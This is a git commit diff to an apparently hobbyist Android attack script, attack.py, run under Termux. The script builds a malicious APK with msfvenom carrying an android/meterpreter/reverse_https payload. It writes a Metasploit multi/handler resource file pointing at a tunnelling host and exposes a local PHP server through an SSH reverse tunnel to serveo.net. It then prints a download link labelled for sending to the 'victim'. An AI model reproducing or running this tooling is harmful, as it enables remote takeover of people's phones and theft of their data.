5839b7d57f27cf80851941d2ef75e9f69e05c1d8
Lemon <yadavvibhor2@gmail.com>
2020-07-08 17:49:39 +0530

    .

--- attack.py
+++ attack.py
@@ -20,11 +20,12 @@ for c in string:
 
 port = random.randint(4444, 5555)
 
-os.system('rm automate.rc')
+for na in os.listdir(str(os.getcwd())):
+ if na == 'automate.rc':
+  os.remove('automate.rc')
 
 with open('automate.rc', 'w') as f:
- f.write(f'use exploit/multi/handler\nset payload android/meterpreter/reverse_https\nset LHOST serveo.net\nset LPORT {port}')
-
+ f.write(f'use exploit/multi/handler\nset payload android/meterpreter/reverse_https\nset LHOST serveousercontent.com\nset LPORT {port}')
 def animate():
  for n in range(len(list)):
   for c in cycle:
@@ -51,6 +52,8 @@ def check():
   pass
 
 name = input ('[*] Enter APK name: ')
+if not name.endswith('.apk'):
+ name = f"{name}.apk"
 os.system('clear')
 subprocess.Popen(["php", "-t", "/data/data/com.termux/files/home/Lemon", "-S", "localhost:4545"])
 time.sleep(2)
@@ -59,12 +62,17 @@ print('\n[*] PHP Server started\n')
 check()
 
 print('\n[*] Forwarding HTTP port..\n')
-subprocess.Popen(["ssh", "-o", "StrictHostKeyChecking=accept-new", "-R", "80:localhost:4545", "serveo.net"])
+ser = subprocess.Popen('ssh -o StrictHostKeyChecking=accept-new -R 80:localhost:4545 serveo.net', shell=True, stdout=subprocess.PIPE)
+link = ser.stdout.readline()
+link = link.decode('utf8')
+link = link[34:]
+print(f"\nSend this link to victim after starting Handler : {link}/{name}")
+
 time.sleep(7)
 print('\n')
 
 def generate():
- generate = subprocess.call(f"msfvenom -p android/meterpreter/reverse_https LHOST=serveo.net LPORT={port} R> $HOME/Lemon/{name}", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+ generate = subprocess.call(f"msfvenom -p android/meterpreter/reverse_https LHOST=serveousercontent.com LPORT={port} R> $HOME/Lemon/{name}", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
 
 gen = threading.Thread(target=generate)
 gen.daemon=True
